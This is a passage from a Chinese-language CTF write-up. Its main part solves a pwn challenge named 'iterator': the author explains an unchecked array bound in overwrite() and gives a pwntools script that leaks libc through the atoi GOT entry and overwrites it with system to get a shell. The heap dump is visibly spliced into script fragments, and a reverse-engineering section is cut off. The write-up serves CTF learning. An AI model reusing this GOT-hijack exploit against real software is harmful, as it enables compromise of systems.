            io.close()
            continue
###  总结
这道题和上道题利用方式其实差不多，只是这道题展现形式不一样，更直接的给出了任意地址写4字节，里用同样的方法进行爆破即可成功拿到shell。
## PWN -> iterator （数组无边界检查越界）
###  题目分析
题目没有开pie，环境仍然是2.23，运行程序:
    ----------    1. New phone list
    2. show list item
    3. edit list item
    4. overwrite list
    5. show all list
    6. exit
    ----------    >
ida分析，发现主要漏洞点在overwrite函数里，没有对数组边界进行检查：
    int overwrite()
    {
      int v1; // [rsp+8h] [rbp-48h]
      int start; // [rsp+Ch] [rbp-44h]
      int end; // [rsp+10h] [rbp-40h]
      int v4; // [rsp+14h] [rbp-3Ch]
      __int64 v5; // [rsp+18h] [rbp-38h] BYREF
      __int64 v6; // [rsp+20h] [rbp-30h] BYREF
      __int64 v7; // [rsp+28h] [rbp-28h] BYREF
      __int64 v8; // [rsp+30h] [rbp-20h] BYREF
      _QWORD *list_ptr; // [rsp+38h] [rbp-18h]
      printf("List id: ");
      v1 = input();
      if ( v1  10 )
        return puts("id out of range");
      list_ptr = (_QWORD *)qword_4050E0[v1];
      if ( !list_ptr )
        return puts("List undefined");
      printf("Star id: ");         
      start = input();
      printf("End id: ");
      end = input();               
      printf("New number: ");
      v4 = input();
      v8 = sub_401972(list_ptr);
      v5 = sub_401998(&v8, start);
      v7 = sub_401972(list_ptr);
      v8 = sub_401998(&v7, end);
      v6 = sub_401998(&v8, 1LL);
      v8 = sub_4019D8(list_ptr);
      if ( sub_401A01((__int64)&v6, (__int64)&v8) )
      {
        while ( sub_401A01((__int64)&v5, (__int64)&v6) )
        {
          *(_QWORD *)sub_401A3E((__int64)&v5) = v4;
          sub_401A50(&v5);
        }
      }
      return puts("Overwrite Done");
    }
overwrite函数没有对数组边界检查，导致可以覆盖其他list的内容，导致可以往heap上写地址然后泄露libc。  
题目功能如下：
  1. new申请一个自定义大小的iterator结构，会生成两个chunk，第一个chunk是结构体，指向第二个chunk，存的是iterator的元素具体内容，list指针在bss段
  2. edit编辑iterator的特定idx元素。
  3. overwrite批量修改iterator结构的start到end的元素。在这里没有限制边界导致覆盖其他结构体指针。
  4. show输出结构体某个元素
    pwndbg> x/30gx 0x0000000001ac9c20
    0x1ac9c10:      0x0000000000000000      0x0000000000000021       
    0x1ac9c20:      0x0000000001ac9c40      0x0000000001ac9c48
    0x1ac9c30:      0x0000000001ac9c48      0x0000000000000021
    0x1ac9c40:      0x0000000000000000      0x0000000000000000
    0x1ac9c50:      0x0000000000000000      0x0000000000000021       
    0x1ac9c60:      0x0000000000405070 0x%x \033[0m' % (s, eval(s)))
    uu32 = lambda data        : u32(data.ljust(4, b'\x00'))
    uu64 = lambda data        : u64(data.ljust(8, b'\x00'))
    ur64 = lambda data        : u64(data.rjust(8, b'\x00'))
    def New(count):
        sla("> ",str(1))
        sla(": ",str(count))
    def Show(count,item):
        sla("> ",str(2))
        sla("id: ",str(count))
        sla("id: ",str(item))
    def Edit(count,item,num):
        sla("> ",str(3))
        sla("List id: ",str(count))
        sla("Item id: ",str(item))
        sla("number: ",str(num))
    def Over_write(count,end,num,flags = 1):
        sla("> ",str(4))
        sla("id: ",str(count))
        if flags:
            sla("id: ",str(end))
            sla("id: ",str(end))
        sla("number: ",str(num))
    def show_all():
        sla("> ",str(5))
    New(0x1)#0
    New(0x4)#1
    Over_write(0,4,0x405070) # atoi
    # dbg()
    Show(1,0)
    libc = ELF("./libc.so.6")
    ru("Number: ")
    atoi = int(ru("\n",True),10)
    print(hex(libc.symbols['system']))
    system = atoi - libc.symbols["atoi"]+libc.symbols["system"]
    Edit(1,0,system)
    sla("> ",'sh\x00')
    irt()
###  总结
在处理迭代器时，没有合理的判断迭代器范围，导致了指针越界。合理布局内存可以覆写 Vector 的结构体，执行任意内存读写，最终劫持 Got
表。比赛时没有深入看这道题，还要加强对Vector的结构体理解。总之发现此次比赛题目考点有相似的地方，且都不是很难，主要是自己对其利用方式还是不熟，不能发散的去结合程序思考利用方式，还是得多练习。
## Re ->singin
ida打开直接得到flag。
## Re -> HappyCTF
###  题目分析
    int __cdecl main(int argc, const char **argv, const char **envp)
    {
      void *v3; // eax
      void *v4; // eax
      int result; // eax
      void *v6; // eax
      void *v7; // eax
      int v8; // [esp+5Ch] [ebp-70h]
      char *v9; // [esp+60h] [ebp-6Ch]
      char v10[27]; // [esp+6Ch] [ebp-60h] BYREF
      char v11; // [esp+87h] [ebp-45h]
      char *v12; // [esp+88h] [ebp-44h]